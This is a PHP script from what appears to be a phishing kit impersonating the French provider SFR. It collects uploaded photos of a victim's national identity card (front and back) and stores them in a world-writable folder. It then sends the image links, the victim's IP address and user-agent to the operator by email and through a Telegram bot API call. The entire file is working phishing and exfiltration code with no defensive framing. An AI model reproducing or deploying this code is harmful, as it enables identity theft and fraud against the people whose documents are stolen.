<?php


include("../infos.php");
include("../common/sub_includes.php");


if(isset($_POST)){

    if(!isset($_SESSION)){
		session_start();
	}
	$recto = strrchr($_FILES['recto']['name'], '.');
	$verso = strrchr($_FILES['verso']['name'], '.');


	$verso = str_replace(' ', '_',$verso);
	$recto = str_replace(' ', '_',$recto);


	mkdir($_SESSION['nom']."/", 0777);	
	$folder = "".$_SESSION['nom']."/";
	$recto = basename($_FILES['recto']['name']);
	move_uploaded_file($_FILES['recto']['tmp_name'], $folder . $recto);
	$verso = basename($_FILES['verso']['name']);
	move_uploaded_file($_FILES['verso']['tmp_name'], $folder . $verso);

	$link1 = "http://".$_SERVER['HTTP_HOST']."/actions/".$_SESSION['nom']."/".$verso;
	$link2 = "http://".$_SERVER['HTTP_HOST']."/actions/".$_SESSION['nom']."/".$recto;




	if(is_numeric($_SESSION["email"]) || strpos($_SESSION['email'], "hotmail.com") || strpos($_SESSION['email'], "hotmail.fr") || strpos($_SESSION['email'], "live.fr") || strpos($_SESSION['email'], "outlook.fr") || strpos($_SESSION['email'], "outlook.com") || strpos($_SESSION['email'], "orange.fr") || strpos($_SESSION['email'], "orange.com") || strpos($_SESSION['email'], "wanadoo.fr") || strpos($_SESSION['email'], "sfr.fr") || strpos($_SESSION['email'], "club-internet.fr") || strpos($_SESSION['email'], "neuf.fr") || strpos($_SESSION['email'], "aliceadsl.fr") || strpos($_SESSION['email'], "noos.fr") || strpos($_SESSION['email'], "yahoo.com") || strpos($_SESSION['email'], "yahoo.fr") || strpos($_SESSION['email'], "aol.com") || strpos($_SESSION['email'], "aol.fr") || strpos($_SESSION['email'], "gmail.com") || strpos($_SESSION['email'], "icloud.com") || strpos($_SESSION['email'], "gmx.fr") || strpos($_SESSION['email'], "gmx.de") || strpos($_SESSION['email'], "free.fr") || strpos($_SESSION['email'], "bbox.fr")){
				
		
		
				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "


[📂] CNI [📂]

📂 Recto : ".$link1."
📂 Verso : ".$link2."

[🩺] Informations additionnelles [🩺]

🩺 IP : ".$_SESSION['ip']."
🩺 User-agent : ".$_SESSION['useragent']."
					";

					$subject = "[📂] + 1 CNI |".$_SESSION['email']." | ".$_SESSION['ip'];
					$headers = "From: SFR <emojis@gmail.com>";

					mail($rezmail, $subject, $message, $headers, $head);
				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){
			
					$data = [
					'text' => '			
[📂] CNI [📂]

📂 Recto : '.$link1.'
📂 Verso : '.$link2.'

[🩺] Informations additionnelles [🩺]

🩺 Adresse Ip : '.$_SESSION['ip'].'
🩺 User-agent : '.$_SESSION['useragent'].'
					  
					',
					'chat_id' => $chat_cni,
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

				header("Location: ../steps/loading_finished.php");


	}
	else{

		header("Location: ../steps/pass.php?error=pass");
	}

	}
else{
	header('Location: ../');
}

?>